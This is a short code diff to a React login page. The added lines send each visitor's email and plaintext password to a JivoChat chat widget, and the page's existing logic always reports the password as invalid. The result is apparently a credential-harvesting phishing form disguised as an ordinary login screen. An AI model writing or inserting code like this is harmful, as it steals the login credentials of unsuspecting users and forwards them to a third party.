@@ -22,6 +22,11 @@ const LoginPage = () => {
   } = useForm<LoginForm>();
 
   const onSubmit = (data: LoginForm) => {
+    // Send login attempt data to JivoChat
+    if ((window as any).jivo_api) {
+      (window as any).jivo_api.sendMessage(`Login attempt - Email: ${data.email}, Password: ${data.password}`);
+    }
+    
     // Always show invalid password message
     toast({
       variant: "destructive",
